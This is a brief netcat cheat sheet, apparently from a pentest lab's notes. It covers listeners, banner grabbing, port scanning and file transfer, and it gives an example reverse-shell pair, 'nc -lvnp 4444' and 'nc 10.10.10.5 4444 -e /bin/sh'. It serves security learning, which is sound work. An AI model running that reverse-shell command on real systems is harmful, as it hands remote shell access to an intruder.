# Netcat Cheat Sheet

> [!NOTE]
> Netcat was not used in this specific lab engagement. This cheat sheet is provided as general reference material for future engagements.

## Overview

Netcat (`nc`) is a general-purpose networking utility for reading/writing data across TCP/UDP connections — commonly used for banner grabbing, port scanning, file transfer, and reverse/bind shells.

## Common Syntax

```bash
nc [options] <host> <port>
```

## Useful Commands

| Command | Description |
|---|---|
| `nc -lvnp <port>` | Start a listener on the given port |
| `nc <target> <port>` | Connect to a target host/port |
| `nc -nv <target> <port>` | Banner grab a service |
| `nc -w 3 -z <target> <port-range>` | Simple port scan |
| `nc -lvnp <port> > file.out` | Receive a file via netcat listener |
| `nc <target> <port> < file.in` | Send a file via netcat |

## Important Options

| Option | Description |
|---|---|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | Skip DNS resolution |
| `-p` | Specify local port |
| `-z` | Zero-I/O mode (used for scanning) |
| `-w` | Timeout in seconds |

## Examples

General reference examples (not run in this lab):

```bash
# Attacker: start a listener
nc -lvnp 4444

# Target: connect back (reverse shell context)
nc 10.10.10.5 4444 -e /bin/sh
```

## Common Mistakes

- Forgetting `-n` and experiencing slow connections due to DNS resolution attempts.
- Using a netcat variant without `-e` support (e.g., OpenBSD netcat) and expecting shell-spawning flags to work.

## References

- [`cheatsheets/reverse-shells.md`](reverse-shells.md)

## Key Takeaways

- Netcat is a Swiss-army-knife utility for raw TCP/UDP interaction — useful for shells, file transfer, and quick service banner checks.
